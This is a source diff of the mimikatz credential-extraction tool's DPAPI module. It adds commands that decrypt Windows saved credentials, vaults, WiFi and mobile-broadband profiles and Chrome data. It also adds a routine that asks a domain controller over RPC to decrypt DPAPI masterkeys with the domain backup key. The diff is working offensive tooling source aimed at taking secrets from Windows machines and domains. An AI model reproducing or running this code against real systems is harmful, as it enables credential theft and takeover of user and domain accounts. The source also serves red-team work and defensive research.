@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_dpapi.h"
 
@@ -13,7 +13,13 @@ const KUHL_M_C kuhl_m_c_dpapi[] = {
 	
 	{kuhl_m_dpapi_keys_capi,	L"capi",		L"CAPI key test"},
 	{kuhl_m_dpapi_keys_cng,		L"cng",			L"CNG key test"},
-
+	{kuhl_m_dpapi_cred,			L"cred",		L"CRED test"},
+	{kuhl_m_dpapi_vault,		L"vault",		L"VAULT test"},
+	{kuhl_m_dpapi_wifi,			L"wifi",		L"WiFi test"},
+	{kuhl_m_dpapi_wwan,			L"wwan",		L"Wwan test"},
+#ifdef SQLITE3_OMIT
+	{kuhl_m_dpapi_chrome,		L"chrome",		L"Chrome test"},
+#endif
 	{kuhl_m_dpapi_oe_cache,		L"cache", NULL},
 };
 const KUHL_M kuhl_m_dpapi = {
@@ -27,7 +33,6 @@ NTSTATUS kuhl_m_dpapi_blob(int argc, wchar_t * argv[])
 	PKULL_M_DPAPI_BLOB blob;
 	PCWSTR outfile, infile;
 	PWSTR description = NULL;
-	UNICODE_STRING uString;
 
 	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
 	{
@@ -52,16 +57,8 @@ NTSTATUS kuhl_m_dpapi_blob(int argc, wchar_t * argv[])
 					}
 					else
 					{
-						uString.Length = uString.MaximumLength = (USHORT) dataOut.cbData;
-						uString.Buffer = (PWSTR) dataOut.pbData;
-						kprintf(L"data - ");
-						if((uString.Length <= USHRT_MAX) && (kull_m_string_suspectUnicodeString(&uString)))
-							kprintf(L"text : %s", dataOut.pbData);
-						else
-						{
-							kprintf(L"hex  : ");
-							kull_m_string_wprintf_hex(dataOut.pbData, dataOut.cbData, 1 | (16 << 16));
-						}
+						kprintf(L"data: ");
+						kull_m_string_printSuspectUnicodeString(dataOut.pbData, dataOut.cbData);
 						kprintf(L"\n");
 					}
 					LocalFree(dataOut.pbData);
@@ -80,7 +77,7 @@ NTSTATUS kuhl_m_dpapi_protect(int argc, wchar_t * argv[]) // no support for prot
 	DATA_BLOB dataIn, dataOut, dataEntropy = {0, NULL};
 	PKULL_M_DPAPI_BLOB blob;
 	PCWSTR description = NULL, szEntropy, outfile;
-	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT | CRYPTPROTECT_PROMPT_STRONG, NULL, MIMIKATZ}, *pPrompt;
+	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT, NULL, MIMIKATZ}, *pPrompt;
 	DWORD flags = 0, outputMode = 1;
 
 	kull_m_string_args_byName(argc, argv, L"data", (PCWSTR *) &dataIn.pbData, MIMIKATZ);
@@ -89,6 +86,8 @@ NTSTATUS kuhl_m_dpapi_protect(int argc, wchar_t * argv[]) // no support for prot
 		kull_m_string_stringToHexBuffer(szEntropy, &dataEntropy.pbData, &dataEntropy.cbData);
 	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
 		flags |= CRYPTPROTECT_LOCAL_MACHINE;
+	if(kull_m_string_args_byName(argc, argv, L"system", NULL, NULL))
+		flags |= CRYPTPROTECT_SYSTEM;
 	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;
 	
 	if(kull_m_string_args_byName(argc, argv, L"c", NULL, NULL))
@@ -137,8 +136,9 @@ NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[])
 	PVOID output, derivedKey;
 	PPVK_FILE_HDR pvkBuffer;
 	DWORD szBuffer, szPvkBuffer, cbHash = 0, cbSystem = 0, cbSystemOffset = 0, cbOutput;
-	LPCWSTR szIn = NULL, szSid = NULL, szPassword = NULL, szHash = NULL, szSystem = NULL, szDomainpvk = NULL;
-	PWSTR convertedSid = NULL;
+	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
+	LPCWSTR szIn = NULL, szSid = NULL, szPassword = NULL, szHash = NULL, szSystem = NULL, szDomainpvk = NULL, szDomain = NULL, szDc = NULL;
+	LPWSTR convertedSid = NULL, szTmpDc = NULL;
 	PSID pSid;
 	PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY pCredentialEntry = NULL;
 	PKUHL_M_DPAPI_OE_DOMAINKEY_ENTRY pDomainKeyEntry = NULL;
@@ -191,13 +191,13 @@ NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[])
 						kprintf(L"\n[masterkey] with volatile cache: "); kuhl_m_dpapi_oe_credential_descr(pCredentialEntry);
 						if(masterkeys->dwFlags & 4)
 						{
-							if(pCredentialEntry->flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1)
-								derivedKey = pCredentialEntry->sha1hashDerived;
+							if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1)
+								derivedKey = pCredentialEntry->data.sha1hashDerived;
 						}
 						else
 						{
-							if(pCredentialEntry->flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_MD4)
-								derivedKey = pCredentialEntry->md4hashDerived;
+							if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_MD4)
+								derivedKey = pCredentialEntry->data.md4hashDerived;
 						}
 						if(derivedKey)
 						{
@@ -294,7 +294,7 @@ NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[])
 					if(pDomainKeyEntry = kuhl_m_dpapi_oe_domainkey_get(&masterkeys->DomainKey->guidMasterKey))
 					{
 						kprintf(L"\n[domainkey] with volatile cache: "); kuhl_m_dpapi_oe_domainkey_descr(pDomainKeyEntry);
-						if(kull_m_dpapi_unprotect_domainkey_with_key(masterkeys->DomainKey, pDomainKeyEntry->key, pDomainKeyEntry->keyLen, &output, &cbOutput, &pSid))
+						if(kull_m_dpapi_unprotect_domainkey_with_key(masterkeys->DomainKey, pDomainKeyEntry->data.key, pDomainKeyEntry->data.keyLen, &output, &cbOutput, &pSid))
 							kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, pSid);
 						else PRINT_ERROR(L"kull_m_dpapi_unprotect_domainkey_with_key\n");
 					}
@@ -312,6 +312,38 @@ NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[])
 							else PRINT_ERROR(L"kull_m_dpapi_unprotect_domainkey_with_key\n");
 							LocalFree(pvkBuffer);
 						}
+					}
+
+					if(kull_m_string_args_byName(argc, argv, L"rpc", NULL, NULL))
+					{
+						kprintf(L"\n[domainkey] with RPC\n");
+
+						if(!(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) || kull_m_string_args_byName(argc, argv, L"system", &szDc, NULL)))
+						{
+							if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
+								if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
+									szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;
+							if(szDomain && wcschr(szDomain, L'.'))
+							{
+								kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
+								if(kull_m_net_getDC(szDomain, DS_WRITABLE_REQUIRED, &szTmpDc))
+									szDc = szTmpDc;
+							}
+							else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");
+						}
+
+						if(szDc)
+						{
+							kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
+							if(kull_m_dpapi_unprotect_domainkey_with_rpc(masterkeys, buffer, szDc, &output, &cbOutput))
+								kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
+						}
+						else PRINT_ERROR(L"Domain Controller not present\n");
+
+						if(szTmpDc)
+							LocalFree(szTmpDc);
+						if(pPolicyDnsDomainInfo)
+							LsaFreeMemory(pPolicyDnsDomainInfo);
 					}
 				}
 
@@ -375,10 +407,10 @@ NTSTATUS kuhl_m_dpapi_credhist(int argc, wchar_t * argv[])
 						pCredentialEntry = kuhl_m_dpapi_oe_credential_get(NULL, prevGuid);
 						if(!pCredentialEntry)
 							pCredentialEntry = kuhl_m_dpapi_oe_credential_get(convertedSid, NULL);
-						if(pCredentialEntry && (pCredentialEntry->flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1))
+						if(pCredentialEntry && (pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1))
 						{
 							kprintf(L"\n  [entry %u] with volatile cache: ", i); kuhl_m_dpapi_oe_credential_descr(pCredentialEntry);
-							if(kull_m_dpapi_unprotect_credhist_entry_with_shaDerivedkey(credhist->entries[i], pCredentialEntry->sha1hashDerived, sizeof(pCredentialEntry->sha1hashDerived), ntlm, sha1))
+							if(kull_m_dpapi_unprotect_credhist_entry_with_shaDerivedkey(credhist->entries[i], pCredentialEntry->data.sha1hashDerived, sizeof(pCredentialEntry->data.sha1hashDerived), ntlm, sha1))
 							{
 								kuhl_m_dpapi_oe_credential_copyEntryWithNewGuid(pCredentialEntry, prevGuid);
 								kuhl_m_dpapi_display_CredHist(credhist->entries[i], ntlm, sha1);
@@ -419,7 +451,7 @@ BOOL kuhl_m_dpapi_unprotect_raw_or_blob(LPCVOID pDataIn, DWORD dwDataInLen, LPWS
 	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT | CRYPTPROTECT_PROMPT_STRONG, NULL, MIMIKATZ}, *pPrompt;
 
 	PBYTE masterkey = NULL, entropy = NULL;
-	DWORD masterkeyLen = 0, entropyLen = 0;
+	DWORD masterkeyLen = 0, entropyLen = 0, flags = 0;
 	PKULL_M_DPAPI_BLOB blob;
 	PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY entry = NULL;
 	BOOL isNormalAPI = kull_m_string_args_byName(argc, argv, L"unprotect", NULL, NULL);
@@ -431,56 +463,63 @@ BOOL kuhl_m_dpapi_unprotect_raw_or_blob(LPCVOID pDataIn, DWORD dwDataInLen, LPWS
 		kull_m_string_stringToHexBuffer(szEntropy, &entropy, &entropyLen);
 	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;
 
+	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
+		flags |= CRYPTPROTECT_LOCAL_MACHINE;
+
 	if(blob = kull_m_dpapi_blob_create(pDataIn))
 	{
 		entry = kuhl_m_dpapi_oe_masterkey_get(&blob->guidMasterKey);
-	
+		if(entry || (masterkey && masterkeyLen) || isNormalAPI)
+		{
+			if(pText)
+				kprintf(L"%s", pText);
 
-	if(entry || (masterkey && masterkeyLen) || isNormalAPI)
-	{
-		if(pText)
-			kprintf(L"%s", pText);
-		
-		if(entry)
-		{
-			kprintf(L" * volatile cache: ");
-			kuhl_m_dpapi_oe_masterkey_descr(entry);
-		}
-		if(masterkey)
-		{
-			kprintf(L" * masterkey     : ");
-			kull_m_string_wprintf_hex(masterkey, masterkeyLen, 0);
-			kprintf(L"\n");
-		}
-		if(pPrompt)
-		{
-			kprintf(L" > prompt flags  : ");
-			kull_m_dpapi_displayPromptFlags(pPrompt->dwPromptFlags);
-			kprintf(L"\n");
-		}
-		if(entropy)
-		{
-			kprintf(L" > entropy       : ");
-			kull_m_string_wprintf_hex(entropy, entropyLen, 0);
-			kprintf(L"\n");
-		}
-		if(szPassword)
-			kprintf(L" > password      : %s\n", szPassword);
-
-		if(entry)
-			status = kull_m_dpapi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, NULL, 0, pDataOut, dwDataOutLen, entry->keyHash, sizeof(entry->keyHash), szPassword);
-		
-		if(!status && ((masterkey && masterkeyLen) || isNormalAPI))
-		{
-			status = kull_m_dpapi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, pPrompt, pPrompt ? 0 : CRYPTPROTECT_UI_FORBIDDEN, pDataOut, dwDataOutLen, masterkey, masterkeyLen, szPassword);
-			if(status && masterkey && masterkeyLen)
-				kuhl_m_dpapi_oe_masterkey_add(&blob->guidMasterKey, masterkey, masterkeyLen);
+			if(isNormalAPI)
+			{
+				kprintf(L" * using CryptUnprotectData API\n");
+			}
 			
-			if(!status && !masterkey)
-				PRINT_ERROR_AUTO(L"CryptUnprotectData");
+			if(entry)
+			{
+				kprintf(L" * volatile cache: ");
+				kuhl_m_dpapi_oe_masterkey_descr(entry);
+			}
+			if(masterkey)
+			{
+				kprintf(L" * masterkey     : ");
+				kull_m_string_wprintf_hex(masterkey, masterkeyLen, 0);
+				kprintf(L"\n");
+			}
+			if(pPrompt)
+			{
+				kprintf(L" > prompt flags  : ");
+				kull_m_dpapi_displayPromptFlags(pPrompt->dwPromptFlags);
+				kprintf(L"\n");
+			}
+			else flags |= CRYPTPROTECT_UI_FORBIDDEN;
+			if(entropy)
+			{
+				kprintf(L" > entropy       : ");
+				kull_m_string_wprintf_hex(entropy, entropyLen, 0);
+				kprintf(L"\n");
+			}
+			if(szPassword)
+				kprintf(L" > password      : %s\n", szPassword);
+
+			if(entry)
+				status = kull_m_dpapi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, NULL, 0, pDataOut, dwDataOutLen, entry->data.keyHash, sizeof(entry->data.keyHash), szPassword);
+
+			if(!status && ((masterkey && masterkeyLen) || isNormalAPI))
+			{
+				status = kull_m_dpapi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, pPrompt, flags, pDataOut, dwDataOutLen, masterkey, masterkeyLen, szPassword);
+				if(status && masterkey && masterkeyLen)
+					kuhl_m_dpapi_oe_masterkey_add(&blob->guidMasterKey, masterkey, masterkeyLen);
+
+				if(!status && !masterkey)
+					PRINT_ERROR_AUTO(L"CryptUnprotectData");
+			}
+			//kprintf(L"\n");
 		}
-		kprintf(L"\n");
-	}
 		kull_m_dpapi_blob_delete(blob);
 	}
 
